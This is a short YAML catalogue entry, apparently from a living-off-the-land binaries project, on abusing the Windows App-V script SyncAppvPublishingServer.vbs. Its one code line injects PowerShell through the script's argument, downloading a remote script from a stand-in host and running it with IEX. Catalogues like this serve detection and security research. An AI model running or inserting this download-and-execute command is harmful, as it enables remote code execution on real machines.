---
name: syncappvpublishingserver.vbs
description: Refresh operation for Application Virtualization (App-V) publishing
functions:
  execute:
    - description: Inject PowerShell script code with the provided arguments
      code: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
resources: 
    - resource: https://twitter.com/monoxgas/status/895045566090010624
    - resource: https://twitter.com/subTee/status/855738126882316288
    - resource: https://docs.microsoft.com/en-us/powershell/module/appvclient/sync-appvpublishingserver?view=win10-ps
fullpath: 
    - path: C:\Windows\System32\SyncAppvPublishingServer.vbs
notes: Thanks to Nick Landers - @monoxgas, Casey Smith - @subTee
---
